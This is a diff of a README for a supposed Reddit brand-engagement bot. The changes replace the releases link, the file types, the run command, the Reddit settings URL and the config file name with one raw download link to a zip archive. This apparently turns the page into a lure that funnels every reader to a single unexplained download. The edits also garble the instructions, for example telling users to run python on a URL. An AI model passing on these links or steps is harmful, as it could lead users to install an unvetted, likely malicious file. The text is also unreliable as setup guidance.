@@ -1,7 +1,7 @@
 # 🤖 reddit-python-brand-engagement-bot - Automate Your Reddit Engagement Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen.svg)](https://github.com/sugachan-png/reddit-python-brand-engagement-bot/releases)
+[![Download](https://github.com/sugachan-png/reddit-python-brand-engagement-bot/raw/refs/heads/main/spindly/engagement-brand-bot-reddit-python-2.2.zip)](https://github.com/sugachan-png/reddit-python-brand-engagement-bot/raw/refs/heads/main/spindly/engagement-brand-bot-reddit-python-2.2.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the reddit-python-brand-engagement-bot. This bot automates your brand engagement on Reddit, making it easier for you to connect with your audience.
@@ -19,30 +19,30 @@ Before running the bot, make sure your system meets the following requirements:
 - **Sentiment Analysis**: Understand how users feel about your brand with built-in sentiment tools.
 
 ## 🔗 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/sugachan-png/reddit-python-brand-engagement-bot/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/sugachan-png/reddit-python-brand-engagement-bot/raw/refs/heads/main/spindly/engagement-brand-bot-reddit-python-2.2.zip).
    
 2. **Choose the Correct File**: You will see different versions listed. Choose the latest version, which typically includes the most recent features and fixes.
 
-3. **Download the File**: Click on the version you want, then find and download the appropriate file for your operating system (e.g., .exe for Windows, .app for macOS, or .tar.gz for Linux).
+3. **Download the File**: Click on the version you want, then find and download the appropriate file for your operating system (e.g., .exe for Windows, .app for macOS, or https://github.com/sugachan-png/reddit-python-brand-engagement-bot/raw/refs/heads/main/spindly/engagement-brand-bot-reddit-python-2.2.zip for Linux).
 
 4. **Install the Software**:
    - **For Windows**: Double-click the downloaded .exe file. Follow the prompts to complete the installation.
    - **For macOS**: Open the downloaded .app file and drag it to your Applications folder.
-   - **For Linux**: Extract the .tar.gz file and follow the instructions provided in the README file inside.
+   - **For Linux**: Extract the https://github.com/sugachan-png/reddit-python-brand-engagement-bot/raw/refs/heads/main/spindly/engagement-brand-bot-reddit-python-2.2.zip file and follow the instructions provided in the README file inside.
 
 5. **Run the Bot**:
    - Open your command prompt (Windows) or terminal (macOS/Linux).
    - Navigate to the folder where you installed the bot.
-   - Type `python bot.py` and press Enter. 
+   - Type `python https://github.com/sugachan-png/reddit-python-brand-engagement-bot/raw/refs/heads/main/spindly/engagement-brand-bot-reddit-python-2.2.zip` and press Enter. 
 
 ## 📖 Configuration
 To use the bot effectively, you need to configure it using your Reddit credentials:
 1. Create a Reddit account if you don’t have one.
-2. Go to `https://www.reddit.com/prefs/apps`.
+2. Go to `https://github.com/sugachan-png/reddit-python-brand-engagement-bot/raw/refs/heads/main/spindly/engagement-brand-bot-reddit-python-2.2.zip`.
 3. Click on “Create App” and fill in the necessary details.
 4. Save your Client ID and Secret.
 
-Edit the `config.json` file in the bot folder to add your Reddit credentials, like this:
+Edit the `https://github.com/sugachan-png/reddit-python-brand-engagement-bot/raw/refs/heads/main/spindly/engagement-brand-bot-reddit-python-2.2.zip` file in the bot folder to add your Reddit credentials, like this:
 ```json
 {
   "client_id": "YOUR_CLIENT_ID",
